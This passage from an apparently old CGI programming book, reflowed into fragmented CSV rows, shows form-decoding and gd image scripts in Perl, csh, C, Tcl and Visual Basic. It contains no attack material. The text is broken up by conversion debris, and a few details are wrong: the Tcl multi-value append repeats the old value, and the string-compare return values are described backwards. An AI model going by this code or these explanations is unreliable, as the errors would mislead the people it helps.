"<IMG SRC=""/cgi-bin/gd_text.pl?message=Welcome+to+this+Web+server&color=Red>",NA,NA
"This will place the GIF image with the message ""Welcome to this Web server"" in red into your HTML ",NA,NA
"document. Now, here's the program:",NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use GD; ,NA,NA
$| = 1; ,NA,NA
"$webmaster = ""shishir\@bu\.edu""; ",NA,NA
"print ""Content-type: image/gif"", ""\n\n""; ",NA,NA
&parse_form_data (*color_text); ,NA,NA
$message = $color_text{'message'}; ,NA,NA
$color = $color_text{'color'}; ,NA,NA
if (!$message) {,NA,NA
" $message = ""This is an example of "" . $color . "" text""; ",NA,NA
},NA,NA
The form data is parsed and placed in the ,NA,NA
color_text,NA,NA
 associative array. The selected text and color are stored in ,NA,NA
$message,NA,NA
", and ",NA,NA
$color,NA,NA
", respectively. If the user did not enter any text, a default message is chosen.",NA,NA
This program uses the ,NA,NA
gd,NA,NA
" graphics library, which we discuss more fully in ",NA,NA
"Chapter 6, ",NA,NA
Hypermedia Documents,NA,NA
.,NA,NA
$font_length = 8; ,NA,NA
$font_height = 16; ,NA,NA
$length = length ($message); ,NA,NA
$x = $length * $font_length; ,NA,NA
$y = $font_height; ,NA,NA
"$image = new GD::Image ($x, $y);",NA,NA
The length of the user-specified string is determined. A new image is created based on this length.,NA,NA
"$white = $image->colorAllocate (255, 255, 255); ",NA,NA
"if ($color eq ""Red"") {",NA,NA
" @color_index = (255, 0, 0); ",NA,NA
"} elsif ($color eq ""Blue"") {",NA,NA
" @color_index = (0, 0, 255); ",NA,NA
"} elsif ($color eq ""Green"") {",NA,NA
" @color_index = (0, 255, 0); ",NA,NA
"} elsif ($color eq ""Yellow"") {",NA,NA
" @color_index = (255, 255, 0); ",NA,NA
"} elsif ($color eq ""Orange"") {",NA,NA
" @color_index = (255, 165, 0); ",NA,NA
"} elsif ($color eq ""Purple"") {",NA,NA
" @color_index = (160, 32, 240); ",NA,NA
"} elsif ($color eq ""Brown"") {",NA,NA
" @color_index = (165, 42, 42); ",NA,NA
"} elsif ($color eq ""Black"") {",NA,NA
" @color_index = (0, 0, 0); ",NA,NA
} ,NA,NA
$selected_color = $image->colorAllocate (@color_index); ,NA,NA
$image->transparent ($white);,NA,NA
"Red, Green, and Blue (RGB) values for the user-selected color are stored in the ",NA,NA
color_index,NA,NA
 array. If no color is ,NA,NA
"selected manually, the default is Red, as specified in the form. If you want to add more colors, look in ",NA,NA
/usr/local/X11/lib/rgb.txt,NA,NA
 for a list of the common colors. The ,NA,NA
transparent,NA,NA
 function makes the image ,NA,NA
background transparent.,NA,NA
"$image->string (gdLargeFont, 0, 0, $message, $selected_color);",NA,NA
print $image->gif;,NA,NA
exit(0);,NA,NA
The text is displayed using the ,NA,NA
string,NA,NA
" operator, and the image is printed to standard output. As discussed in the ",NA,NA
"previous example, you can also access this program with a GET request.",NA,NA
Sending Data to the Server,NA,NA
Decoding Forms in Other,NA,NA
Languages,NA,NA
4.4 Decoding Forms in Other Languages,NA,NA
"Since Perl contains powerful pattern-matching operators and string manipulation functions, it is very simple to ",NA,NA
"decode form information. Unfortunately, this process is not as easy when dealing with other high-level ",NA,NA
"languages, as most of them lack these kinds of operators. However, there are various libraries of functions on the ",NA,NA
"Internet that make the decoding process easier, as well as the ",NA,NA
uncgi,NA,NA
 program ,NA,NA
(,NA,NA
http://www.hyperion.com/~koreth/uncgi.html,NA,NA
).,NA,NA
C Shell (csh),NA,NA
It is difficult to decode form information using native C shell commands. ,NA,NA
csh,NA,NA
 was not designed to perform this ,NA,NA
"type of string manipulation. As a result, you have to use external programs to achieve the task. The easiest and ",NA,NA
most versatile package available for handling form queries is ,NA,NA
uncgi,NA,NA
", which decodes the form information and ",NA,NA
stores them in environment variables that can be accessed not only by ,NA,NA
csh,NA,NA
", but also by any other language, such ",NA,NA
"as Perl, Tcl, and C/C++. For example, if the form contains two text fields, named ""user"" and ""age,"" ",NA,NA
uncgi,NA,NA
 will ,NA,NA
"place the form data in the variables WWW_user and WWW_age, respectively. Here is a simple form and a ",NA,NA
csh ,NA,NA
CGI script to handle the information:,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Simple C Shell and uncgi Example</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>Simple C Shell and uncgi Example</H1> ,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""/cgi-bin/uncgi/simple.csh"" METHOD=""POST""> ",NA,NA
"Enter name: <INPUT TYPE=""text"" NAME=""name"" SIZE=40><BR> Age: ",NA,NA
"<INPUT TYPE=""text"" NAME=""age"" SIZE=3 MAXLENGTH=3><BR> What ",NA,NA
do you like:<BR> ,NA,NA
"<SELECT NAME=""drink"" MULTIPLE> ",NA,NA
<OPTION>Coffee ,NA,NA
<OPTION>Tea ,NA,NA
<OPTION>Soft Drink ,NA,NA
<OPTION>Alcohol ,NA,NA
<OPTION>Milk ,NA,NA
<OPTION>Water ,NA,NA
</SELECT> ,NA,NA
<P> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit the form""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM> ,NA,NA
<HR> ,NA,NA
</BODY> ,NA,NA
</HTML>,NA,NA
Notice the URL associated with the ACTION attribute! It points to the ,NA,NA
uncgi,NA,NA
" executable, with extra path ",NA,NA
information (your program name). The server executes ,NA,NA
uncgi,NA,NA
", which then invokes your program based on the ",NA,NA
"path information. Remember, your program does not necessarily have to be a ",NA,NA
csh,NA,NA
 script; it can be a program ,NA,NA
"written in any language. Now, let's look at the program.",NA,NA
#!/usr/local/bin/csh ,NA,NA
"echo ""Content-type: text/plain"" ",NA,NA
"echo """"",NA,NA
The usual header information is printed out.,NA,NA
if ($?WWW_name) then,NA,NA
" echo ""Hi $WWW_name -- Nice to meet you."" ",NA,NA
else,NA,NA
" echo ""Don't want to tell me your name, huh?""",NA,NA
" echo ""I know you are calling in from $REMOTE_HOST.""",NA,NA
" echo """" ",NA,NA
endif,NA,NA
uncgi,NA,NA
" takes the information in the ""name"" text entry field and places it in the environment variable WWW_name.",NA,NA
In ,NA,NA
csh,NA,NA
", environment variables are accessed by prefixing a ""$"" to the name (e.g., $REMOTE_HOST). When ",NA,NA
"checking for the existence of variables, however, you must use the C shell's $? construct. I use $? in the ",NA,NA
conditional to check for the existence of WWW_Name. You cannot check for the existence of data directly:,NA,NA
if ($WWW_name) then,NA,NA
 .... ,NA,NA
else,NA,NA
 .... ,NA,NA
endif,NA,NA
"If the user did not enter any data into the ""name"" text entry field, ",NA,NA
uncgi,NA,NA
 will not set a corresponding environment ,NA,NA
"variable. If you then try to check for data using the method shown above, the C shell will give you an error ",NA,NA
indicating the variable does not exist.,NA,NA
"The same procedure is applied to the ""age"" text entry field.",NA,NA
if ($?WWW_age) then,NA,NA
" echo ""You are $WWW_age years old."" ",NA,NA
else,NA,NA
" echo ""Are you shy about your age?"" ",NA,NA
endif ,NA,NA
"echo """" ",NA,NA
if ($?WWW_drink) then,NA,NA
" echo ""You like: $WWW_drink"" | tr '#' '' ",NA,NA
else,NA,NA
" echo ""I guess you don't like any fluids."" ",NA,NA
endif ,NA,NA
exit(0),NA,NA
Here is another important point to remember. Since the form contains a scrolled list with the multiple selection ,NA,NA
"property, ",NA,NA
uncgi,NA,NA
" will place all the selected values in the variable, separated by the "" #"" symbol. The UNIX ",NA,NA
command ,NA,NA
tr,NA,NA
" converts the ""#"" character to the space character within the variable for viewing purposes.",NA,NA
C/C++,NA,NA
There are a few form decoding function libraries for C and C++. These include the previously mentioned ,NA,NA
uncgi ,NA,NA
"library, and Enterprise Integration Technologies Corporation's (EIT) ",NA,NA
libcgi,NA,NA
. Both of them are simple to use.,NA,NA
C/C++ decoding using uncgi,NA,NA
Let's look at an example using ,NA,NA
uncgi,NA,NA
 (assuming the HTML form is the same as the one used in the previous ,NA,NA
example):,NA,NA
#include <stdio.h> ,NA,NA
#include <stdlib.h>,NA,NA
These two libraries--standard I/O and standard library--are used in the following program. The ,NA,NA
getenv,NA,NA
" function, ",NA,NA
"used to access environment variables, is declared in ",NA,NA
stdlib.h,NA,NA
.,NA,NA
void main (void) ,NA,NA
{,NA,NA
" char *name,",NA,NA
" *age,",NA,NA
" *drink,",NA,NA
 *remote_host;,NA,NA
" printf (""Content-type: text/plain\n\n"");",NA,NA
 uncgi();,NA,NA
Four variables are declared to store environment variable data. The ,NA,NA
uncgi,NA,NA
 function retrieves the form information ,NA,NA
"and stores it in environment variables. For example, a form variable called ",NA,NA
name,NA,NA
", would be stored in the ",NA,NA
environment variable WWW_name.,NA,NA
" name = getenv (""WWW_name"");",NA,NA
" age = getenv (""WWW_age"");",NA,NA
" drink = getenv (""WWW_drink"");",NA,NA
" remote_host = getenv (""REMOTE_HOST"");",NA,NA
The ,NA,NA
getenv,NA,NA
" standard library function reads the environment variables, and returns a string containing the ",NA,NA
appropriate information.,NA,NA
 if (name == NULL) {,NA,NA
" printf (""Don't want to tell me your name, huh?\n"");",NA,NA
" printf (""I know you are calling in from %s.\n\n"", remote_host); ",NA,NA
} else {,NA,NA
" printf (""Hi %s -- Nice to meet you.\n"", name);",NA,NA
 },NA,NA
 if (age == NULL) {,NA,NA
" printf (""Are you shy about your age?\n""); ",NA,NA
} else {,NA,NA
" printf (""You are %s years old.\n"", age); ",NA,NA
},NA,NA
" printf (""\n"");",NA,NA
"Depending on the user information in the form, various informational messages are output.",NA,NA
 if (drink == NULL) {,NA,NA
" printf (""I guess you don't like any fluids.\n""); ",NA,NA
} else {,NA,NA
" printf (""You like: "");",NA,NA
 while (*drink != '\0') {,NA,NA
 if (*drink == '#') {,NA,NA
" printf ("" "");",NA,NA
 } else {,NA,NA
" printf (""%c"", *drink);",NA,NA
 },NA,NA
 ++drink;,NA,NA
 },NA,NA
},NA,NA
 },NA,NA
" printf (""\n"");",NA,NA
 exit(0);,NA,NA
"The program checks each character in order to convert the ""#"" symbols to spaces. If the character is a ""#"" symbol, ",NA,NA
"a space is output. Otherwise, the character itself is displayed. This process takes up eight lines of code, and is ",NA,NA
"difficult to implement when compared to Perl. In Perl, it can be done simply like this:",NA,NA
$drink =~ s/#/ /g;,NA,NA
This example points out one of the major deficiencies of C for CGI program design: pattern matching.,NA,NA
C/C++ decoding using libcgi,NA,NA
"Now, let's look at another example in C. But this time, we will use EIT's ",NA,NA
libcgi,NA,NA
" library, which you can get from ",NA,NA
http://wsk.eit.com/wsk/dist/doc/libcgi/libcgi.html,NA,NA
.,NA,NA
#include <stdio.h> ,NA,NA
"#include ""cgi.h""",NA,NA
The header file ,NA,NA
cgi.h,NA,NA
" contains the prototypes for the functions in the library. Simply put, the file--like all the other ",NA,NA
header files--contains a list of all the functions and their arguments.,NA,NA
cgi_main (cgi_info *cgi) ,NA,NA
{,NA,NA
" char *name,",NA,NA
" *age,",NA,NA
" *drink,",NA,NA
 *remote_host;,NA,NA
Notice that there is no ,NA,NA
main,NA,NA
 function in this program. The ,NA,NA
libcgi,NA,NA
 library actually contains the ,NA,NA
main,NA,NA
" function, ",NA,NA
which fills a struct called ,NA,NA
cgi_info,NA,NA
 with environment variables and data retrieved from the form. It passes this ,NA,NA
struct to your ,NA,NA
cgi_main,NA,NA
" function. In the function I've written here, the variable ",NA,NA
cgi,NA,NA
 refers to that struct:,NA,NA
 form_entry *form_data;,NA,NA
The variable type ,NA,NA
form_entry,NA,NA
" is a linked list that is meant to hold key/value pairs, and is defined in the library. In ",NA,NA
"this program, ",NA,NA
form_data,NA,NA
 is declared to be of type ,NA,NA
form_entry,NA,NA
.,NA,NA
" print_mimeheader (""text/plain"");",NA,NA
The ,NA,NA
print_mimeheader,NA,NA
" function is used to output a specific MIME header. Technically, this function is not any ",NA,NA
different from doing the following:,NA,NA
" print ""Content-type: text/plain\n\n"";",NA,NA
"However, the function does simplify things a bit, in that the programmer does not have to worry about ",NA,NA
accidentally forgetting to output the two newline characters after the MIME header.,NA,NA
 form_data = get_form_entries (cgi);,NA,NA
" name = parmval (form_data, ""name"");",NA,NA
" age = parmval (form_data, ""age"");",NA,NA
" drink = parmval (form_data, ""drink"");",NA,NA
The ,NA,NA
get_form_entries,NA,NA
 function parses the ,NA,NA
cgi,NA,NA
" struct for form information, and places it in the variable ",NA,NA
form_data,NA,NA
. ,NA,NA
The function takes care of decoding the hexadecimal characters in the input. The ,NA,NA
parmval,NA,NA
 function retrieves the ,NA,NA
value corresponding to each form variable (key).,NA,NA
 if (name == NULL) {,NA,NA
" printf (""Don't want to tell me your name, huh?\n"");",NA,NA
" printf (""I know you are calling in from %s.\n\n"", cgi->remote_host); ",NA,NA
} else {,NA,NA
" printf (""Hi %s -- Nice to meet you.\n"", name);",NA,NA
 },NA,NA
Notice how the REMOTE_HOST environment variable is accessed. The ,NA,NA
libcgi,NA,NA
 library places all the environment ,NA,NA
variable information into the ,NA,NA
cgi,NA,NA
 struct.,NA,NA
"Of course, you can still use the ",NA,NA
getenv,NA,NA
 function to retrieve environment information.,NA,NA
 if (age == NULL) {,NA,NA
" printf (""Are you shy about your age?\n""); ",NA,NA
} else {,NA,NA
" printf (""You are %s years old.\n"", age); ",NA,NA
},NA,NA
" printf (""\n"");",NA,NA
 if (drink == NULL) {,NA,NA
" printf (""I guess you don't like any fluids.\n""); ",NA,NA
} else {,NA,NA
" printf (""You like: %s"", drink);",NA,NA
" printf (""\n"");",NA,NA
 },NA,NA
},NA,NA
 free_form_entries (form_data); ,NA,NA
exit(0);,NA,NA
"Unfortunately, this library does not handle multiple keys properly. For example, if the form has multiple ",NA,NA
"checkboxes with the same variable name, ",NA,NA
libcgi,NA,NA
 will return just one value for a specific key.,NA,NA
"Once the form processing is complete, you should call the ",NA,NA
free_form_entries,NA,NA
 function to remove the linked list ,NA,NA
from memory.,NA,NA
"In addition to the functions discussed, ",NA,NA
libcgi,NA,NA
 offers numerous other ones to aid in form processing. One of the ,NA,NA
functions that you might find useful is the ,NA,NA
mcode,NA,NA
 function. Here is an example illustrating this function:,NA,NA
switch (mcode (cgi)) {,NA,NA
 case MCODE_GET:,NA,NA
" printf(""Request Method: GET\n"");",NA,NA
 break;,NA,NA
 case MCODE_POST:,NA,NA
" printf(""Request Method: POST\n"");",NA,NA
 break;,NA,NA
 default:,NA,NA
" printf(""Unrecognized method: %s\n"", cgi->request_method);",NA,NA
} ,NA,NA
The ,NA,NA
mcode,NA,NA
 function reads the REQUEST_METHOD information from the ,NA,NA
cgi,NA,NA
 struct and returns a code ,NA,NA
identifying the type of request.,NA,NA
Tcl,NA,NA
"Unlike C/C++, Tcl does contain semi-efficient pattern matching functions. These functions can be used to decode ",NA,NA
"form information. However, according to benchmark test results posted in ",NA,NA
comp.lang.perl,NA,NA
", the regular expression ",NA,NA
"functions as implemented in Tcl are quite inefficient, especially when compared to Perl. But you are not limited ",NA,NA
"to writing form decoding routines in Tcl, because you can still use ",NA,NA
uncgi,NA,NA
.,NA,NA
"Tcl, like Perl, has been extended to include the ",NA,NA
gd,NA,NA
" graphics library. In this section, we'll see how Tcl works with ",NA,NA
gd,NA,NA
" graphics, and along the way learn how to decode input either by invoking ",NA,NA
uncgi,NA,NA
 or by spinning our own Tcl ,NA,NA
"code. We'll write a trivial program to display color text, just like the Perl program earlier in the chapter.",NA,NA
#!/usr/local/bin/gdtcl,NA,NA
"puts ""Content-type: image/gif\n"" ",NA,NA
set font_height 16,NA,NA
set font_length 8 ,NA,NA
set color $env(WWW_color),NA,NA
"In Tcl, variables are declared with the ",NA,NA
set,NA,NA
" command. The font height and length are set to 16 and 8, respectively. ",NA,NA
And color is equated to the environment variable WWW_color-set by ,NA,NA
uncgi,NA,NA
. The ,NA,NA
env,NA,NA
 array is equivalent to Perl's ,NA,NA
"ENV associative array. The ""$"" sign instructs Tcl to substitute the value of the variable. If we did not include the ",NA,NA
"""$"" sign, the variable would be set to the literal string ""env(WWW_color)"".",NA,NA
if {[info exists env(WWW_message)]} {,NA,NA
 set message $env(WWW_message),NA,NA
} else {,NA,NA
" set message ""This is an example of $color text""",NA,NA
},NA,NA
"This block of code sets the message to be displayed. If the user submitted a message, the variable message is set ",NA,NA
"to it. Otherwise, a default message is output.",NA,NA
"For people not familiar with Tcl syntax and commands, the ",NA,NA
info,NA,NA
 command can use some explanation. It has to ,NA,NA
appear in square brackets which tell Tcl to execute the command and pass the return value back to the ,NA,NA
if ,NA,NA
command. ,NA,NA
info exists,NA,NA
" checks whether a variable has been defined, and returns a true or false value.",NA,NA
set message_length  [string length $message],NA,NA
set x  [expr $message_length * $font_length] ,NA,NA
set y  $font_height,NA,NA
"Here we determine the width and height of the image, assigning those values to ",NA,NA
x,NA,NA
 and ,NA,NA
y,NA,NA
. The ,NA,NA
string length ,NA,NA
"command determines how many characters are in the string. This value, temporarily stored in ",NA,NA
message_length,NA,NA
", ",NA,NA
"must be multiplied by the font length to get the total number of pixels in the message. To do basic arithmetic, Tcl ",NA,NA
offers the ,NA,NA
expr,NA,NA
 command.,NA,NA
set image  [gd create $x $y] ,NA,NA
set white  [gd color new $image 255 255 255],NA,NA
The ,NA,NA
gd create,NA,NA
" command requires the user to specify the length and height of the image. The image is created, and ",NA,NA
the handle to it is stored in the variable ,NA,NA
image,NA,NA
. The background color is set to white. Although the ,NA,NA
gd,NA,NA
 commands ,NA,NA
"in Tcl have a slightly different syntax than those in Perl, their operation is identical.",NA,NA
"if {[string compare $color ""Red""] == 0} {",NA,NA
 set color_index [list 255 0 0] ,NA,NA
"} elseif {[string compare $color ""Blue""] == 0} { ",NA,NA
 set color_index [list 0 0 255] ,NA,NA
"} elseif {[string compare $color ""Green""] == 0} {",NA,NA
 set color_index [list 0 255 0] ,NA,NA
"} elseif {[string compare $color ""Yellow""] == 0} {",NA,NA
 set color_index [list 255 255 0] ,NA,NA
"} elseif {[string compare $color ""Orange""] == 0} {",NA,NA
 set color_index [list 255 165 0] ,NA,NA
"} elseif {[string compare $color ""Purple""] == 0} {",NA,NA
 set color_index [list 160 32 240] ,NA,NA
"} elseif {[string compare $color ""Brown""] == 0} {",NA,NA
 set color_index [list 165 42 42] ,NA,NA
"} elseif {[string compare $color ""Black""] == 0} {",NA,NA
 set color_index [list 0 0 0] ,NA,NA
},NA,NA
This is merely a group of if-then-else statements that determine the RGB color index for the user-selected color. ,NA,NA
The ,NA,NA
string compare,NA,NA
" function compares its two arguments and returns either -1, 0, or 1, to indicate that the first ",NA,NA
"argument is greater than, equal to, or less than the second argument, respectively.",NA,NA
"The color has to be a list of three values, not just a string. That is the purpose of the ",NA,NA
list,NA,NA
 command in brackets. It ,NA,NA
creates a list--a construct similar to regular arrays in Perl--and returns it to the ,NA,NA
set,NA,NA
" command, which assigns the ",NA,NA
list to the ,NA,NA
color_index,NA,NA
 variable.,NA,NA
set selected_color  [gd color new $image $color_index] gd ,NA,NA
color transparent $image $white ,NA,NA
gd text $image $selected_color large 0 0 $env(WWW_message) ,NA,NA
gd writeGIF $image stdout ,NA,NA
"The chosen color is selected, and the image background is made transparent. A message is output at coordinate ",NA,NA
"(0, 0), and the entire GIF image is sent to standard output.",NA,NA
flush stdout ,NA,NA
gd destroy $image ,NA,NA
exit 0,NA,NA
"The standard output buffer is flushed before exiting, to ensure that the entire image is sent to the browser. Finally, ",NA,NA
the image handle is destroyed.,NA,NA
"In this program, we've relied on ",NA,NA
uncgi,NA,NA
 to do the hard parsing that Tcl is somewhat weak at. The result is a simple ,NA,NA
"and fully functional handler for a form. But for people who want to do everything in Tcl, here is how to decode a",NA,NA
form:,NA,NA
set webmaster {shishir@bu.edu},NA,NA
The variable ,NA,NA
webmaster,NA,NA
 is set. Notice the braces around the expression indicating no variable substitution.,NA,NA
proc return_error { status keyword message } {,NA,NA
 global webmaster,NA,NA
" puts ""Content-type: text/html""",NA,NA
" puts ""Status: $status $keyword\n""",NA,NA
" puts ""<title>CGI Program - Unexpected Error</title>""",NA,NA
 ,NA,NA
"puts ""<H1>$keyword</H1>""",NA,NA
" puts ""<HR>$message</HR>""",NA,NA
" puts ""Please contact $webmaster for more information"" ",NA,NA
},NA,NA
The keyword ,NA,NA
proc,NA,NA
 is used to define a procedure. The variables inside the first set of braces represent the ,NA,NA
arguments passed by the user. There is a big difference between Perl subroutines and Tcl procedures. Here are the ,NA,NA
two ways in which Tcl is different:,"G 
  
 G",NA
Global values are not available within the procedure default. Before referring to a variable from a higher ,NA,NA
"procedure, you have to declare it with the ",NA,NA
global,NA,NA
 command. You can also affect commands in higher-level ,NA,NA
procedures through the ,NA,NA
upvar,NA,NA
" command, which we'll look at in a moment.",NA,NA
"All variables declared inside a procedure are considered local, and are removed after the procedure ",NA,NA
terminates.,NA,NA
"In this procedure, the global variable ",NA,NA
webmaster,NA,NA
 is used. The procedure puts out an error message that reflects the ,NA,NA
arguments passed.,NA,NA
proc parse_form_data { form_info } {,NA,NA
 global env,NA,NA
 upvar $form_info FORM_DATA,NA,NA
The procedure ,NA,NA
parse_form_data,NA,NA
 is identical to its Perl counterpart at the beginning of this chapter. The ,NA,NA
environment variable array ,NA,NA
env,NA,NA
 is accessed in this procedure with the ,NA,NA
global,NA,NA
 statement. The ,NA,NA
upvar,NA,NA
 keyword ,NA,NA
"allows you to create a local reference to the array passed to this subroutine. Inside the subroutine, the array ",NA,NA
referenced by ,NA,NA
form_info,NA,NA
 is accessed through FORM_DATA.,NA,NA
 set request_method $env(REQUEST_METHOD),NA,NA
" if {[string compare $request_method ""POST""] == 0} {",NA,NA
 set query_string [read stdin $env(CONTENT_LENGTH)],NA,NA
" } elseif {[string compare $request_method ""GET""] == 0} {",NA,NA
 set query_string $env(QUERY_STRING),NA,NA
 } else {,NA,NA
 return_error 500 {Server Error} {Server uses unsupported method},NA,NA
 exit 1,NA,NA
 },NA,NA
This process should look familiar. The type of request determines how form information is loaded into the ,NA,NA
query_string,NA,NA
" variable. If there is an unrecognized method, the procedure ",NA,NA
return_error,NA,NA
 is called with a status of ,NA,NA
500-Server Error.,NA,NA
 set key_value_pairs [split $query_string &],NA,NA
"The query string is split on the ""&"" character. If there are multiple variables-as is the case with most forms--the ",NA,NA
variable ,NA,NA
key_value_pairs,NA,NA
 will represent a list.,NA,NA
 foreach key_value $key_value_pairs {,NA,NA
The ,NA,NA
foreach,NA,NA
" loop structure iterates through each key-value pair. Notice that there is no ""$"" sign in front of the ",NA,NA
variable ,NA,NA
key_value,NA,NA
. This indicates that ,NA,NA
key_value,NA,NA
" will be set each time through the loop. On the other hand, the ",NA,NA
value of the variable ,NA,NA
key_value_pairs,NA,NA
 will be substituted because of the dollar sign. If there is no dollar sign in ,NA,NA
front of ,NA,NA
key_value_pairs,NA,NA
", Tcl will give you an error indicating that a valid list needs to be specified. This concept ",NA,NA
"is very important, as many programmers forget the dollar sign when it is required, and accidentally insert it when ",NA,NA
it is not required.,NA,NA
 set pair [split $key_value =],NA,NA
 set key [lindex $pair 0],NA,NA
 set value [lindex $pair 1],NA,NA
The first command divides the key from the value to create a two-element list. This list is assigned to the variable ,NA,NA
pair,NA,NA
". Since list indexes start at zero, the key will be in list item zero and the value in list item 1. We use the ",NA,NA
lindex ,NA,NA
command to extract the key and then the value.,NA,NA
 regsub -all {\+} $value { } value,NA,NA
The ,NA,NA
regsub,NA,NA
 function substitutes characters within a string. This line of code is equivalent to the following line in ,NA,NA
Perl:,NA,NA
$value =~ s/\+/ /g;,NA,NA
The ,NA,NA
-all,NA,NA
" switch replaces all occurrences of the pattern within the string. In this example, Tcl looks for the plus ",NA,NA
sign (the first argument) in ,NA,NA
$value,NA,NA
" (the second), replaces it with a space (the third), and writes the information ",NA,NA
back into the variable ,NA,NA
value,NA,NA
 (the fourth). You may be confused because the first ,NA,NA
value,NA,NA
 has a dollar sign while the ,NA,NA
second does not. This is because the first time around Tcl is dereferencing the variable--taking input data from it. ,NA,NA
"The second time, it is storing output back into the variable, an operation that requires you to specify the variable ",NA,NA
directly rather than dereference it.,NA,NA
 while {[regexp {%[0-9A-Fa-f][0-9A-Fa-f]} $value matched]} {,NA,NA
" scan $matched ""%%%x"" hex",NA,NA
 set symbol [ctype char $hex],NA,NA
 regsub -all $matched $value $symbol value },NA,NA
This ,NA,NA
while,NA,NA
 loop decodes the hexadecimal characters. The ,NA,NA
regexp,NA,NA
 command is used to search ,NA,NA
value,NA,NA
 for the pattern ,NA,NA
"""%.."", which signifies a three-character string starting with the ""%"" character. The matched string is placed in the ",NA,NA
variable ,NA,NA
matched,NA,NA
". This is like using parentheses in a regular expression to isolate and mark a group of characters, ",NA,NA
but the syntax is simpler. The first string that matches %.. gets assigned to ,NA,NA
matched,NA,NA
". Then, the ",NA,NA
scan,NA,NA
 command ,NA,NA
"with the ""%%%x"" argument converts the hexadecimal number to a decimal number. The ",NA,NA
ctype char,NA,NA
 command ,NA,NA
"converts the decimal number to its ASCII equivalent. Finally, ",NA,NA
regsub,NA,NA
 replaces the hexadecimal string with the ,NA,NA
"ASCII character. This process is quite tedious, especially when we compare it to Perl:",NA,NA
"$value =~ s/%([\dA-Fa-f][\dA-Fa-f])/pack (""C"", hex ($1))/eg;",NA,NA
"Now, let's look at the final part of the program:",NA,NA
 if {[info exists FORM_DATA($key)]} {,NA,NA
" append FORM_DATA($key) ""\0"" $FORM_DATA($key)",NA,NA
 } else {,NA,NA
 set FORM_DATA($key) $value,NA,NA
 }                ,NA,NA
},NA,NA
 },NA,NA
Remember that we started this procedure by assigning FORM_DATA to whatever variable is passed to the ,NA,NA
"procedure. Now we create an entry in FORM_DATA for every key, the key being used as an index into the array. ",NA,NA
"The value becomes the data that the key points to. By checking for an existing key with an if statement, we allow ",NA,NA
"form variables to have multiple values, which is necessary for scrolled lists and multiple checkboxes. As in our ",NA,NA
"Perl version, we put multiple values into a single array element with a null character in between.",NA,NA
"Now, how do we call these procedures? Suppose you have two fields on your form--",NA,NA
name,NA,NA
 and ,NA,NA
age,NA,NA
. You could ,NA,NA
access these variables by doing the following:,NA,NA
parse_form_data simple_form ,NA,NA
"puts ""Your name is: $simple_form(name) and your age is: $simple_form(age)""",NA,NA
The ,NA,NA
parse_form_data,NA,NA
 procedure takes the form information and places it in the ,NA,NA
simple_form,NA,NA
 array. You can then ,NA,NA
look at and manipulate data in ,NA,NA
simple_form,NA,NA
 just like any other array. OA,NA,NA
Visual Basic,NA,NA
As we discussed in ,NA,NA
"Chapter 2, ",NA,NA
Input to the Common Gateway Interface,NA,NA
", the WebSite server for Windows NT and ",NA,NA
Windows 95--as well as the Windows 3.1 HTTP server--passes form information to the CGI program through a ,NA,NA
"Windows profile file. The developer, Bob Denny, designed a library for decoding form information in Visual ",NA,NA
"Basic. Let's use this library to decode some forms. But first, here is the HTML code for creating the form:",NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Health/Exercise Survey</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>Health/Exercise Survey</H1> ,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""\cgi-win\exercise.exe"" METHOD=""POST""> ",NA,NA
<EM>What is your name?</EM><BR> ,NA,NA
"<INPUT TYPE=""text"" NAME=""name"" SIZE=40><BR> ",NA,NA
<P> ,NA,NA
<EM>Do you exercise regularly?</EM><BR> ,NA,NA
"<INPUT TYPE=""radio"" NAME=""regular"" VALUE=""Yes"">Yes<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""regular"" VALUE=""No"">No<BR> ",NA,NA
<P> ,NA,NA
<EM>Why do you exercise?</EM><BR> ,NA,NA
"<INPUT TYPE=""radio"" NAME=""why"" VALUE=""health"">Health Benefits<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""why"" VALUE=""athlete"">Athletic Training<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""why"" VALUE=""forced"">Forced upon you<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""why"" VALUE=""enjoy"">Enjoyment<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""why"" VALUE=""other"">Other reasons<BR> <P> ",NA,NA
<EM>What sport do you <B>primarily</B> participate in?</EM><BR> ,NA,NA
"<SELECT NAME=""sports"" SIZE=1> ",NA,NA
<OPTION>Tennis ,NA,NA
<OPTION>Swimming ,NA,NA
<OPTION>Basketball ,NA,NA
<OPTION>Running/Walking ,NA,NA
<OPTION>Cycling ,NA,NA
<OPTION>Skating/Rollerblading ,NA,NA
<OPTION>Skiing ,NA,NA
<OPTION>Climbing Stairs,NA,NA
<OPTION>Jumping Rope ,NA,NA
<OPTION>Other ,NA,NA
</SELECT> ,NA,NA
<P> ,NA,NA
<EM>How often do you exercise?</EM><BR> ,NA,NA
"<INPUT TYPE=""radio"" NAME=""interval"" VALUE=""0"">Not at all<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""interval"" VALUE=""1"">Once a week<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""interval"" VALUE=""3"">Three times a week<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""interval"" VALUE=""5"">Five times a week<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""interval"" VALUE=""7"">Every day of the week<BR> ",NA,NA
<P> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit the form""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM> ,NA,NA
<HR> ,NA,NA
</BODY> ,NA,NA
</HTML>,NA,NA
Now let's build a Visual Basic CGI program to decode the form information and store the results in a data file. ,NA,NA
The program needs to be compiled before it can be used.,NA,NA
Public Sub CGI_Main(),NA,NA
This program uses the ,NA,NA
CGI.BAS,NA,NA
 library to decode the form information. The function ,NA,NA
Main(),NA,NA
", which in turn calls ",NA,NA
the ,NA,NA
CGI_Main(),NA,NA
